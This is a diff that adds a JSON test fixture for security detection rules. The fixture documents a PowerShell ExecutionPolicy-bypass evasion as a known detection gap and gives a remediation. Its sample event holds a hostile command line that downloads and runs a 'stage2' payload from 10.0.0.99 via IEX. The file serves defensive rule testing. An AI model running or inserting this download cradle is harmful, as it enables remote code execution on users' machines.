@@ -1,0 +1,26 @@
+{
+  "_evasion": {
+    "technique": "T1059.001",
+    "evasion_variant": "obfuscated_execution_policy",
+    "description": "Attacker uses character substitution and string concatenation to obfuscate the -ExecutionPolicy Bypass flag, attempting to evade detection rules that look for literal strings.",
+    "bypass_attempt": "Obfuscating -ExecutionPolicy Bypass using concatenation: 'set-executionpolicy' via IEX",
+    "expected_result": "EVASION_SUCCEEDS",
+    "fawkes_command": "powershell (with obfuscated flags)",
+    "notes": "This is a KNOWN GAP. Our current rule uses literal string matching (*-ExecutionPolicy*Bypass*). Obfuscated variants using Set-ExecutionPolicy or environment variable concatenation will bypass this rule. Mitigation: Enable PowerShell ScriptBlock logging (EID 4104) which captures the deobfuscated command.",
+    "remediation": "Add EID 4104 ScriptBlock detection for Set-ExecutionPolicy calls as a companion rule"
+  },
+  "events": [
+    {
+      "@timestamp": "2026-03-15T10:00:00.000Z",
+      "event": {"code": "1", "category": "process"},
+      "host": {"name": "WORKSTATION-01"},
+      "process": {
+        "name": "powershell.exe",
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe -c \"&{$env:ComSpec}\" iex (new-object net.webclient).downloadstring('http://10.0.0.99/stage2')",
+        "pid": 3344
+      },
+      "user": {"name": "victim_user"}
+    }
+  ]
+}
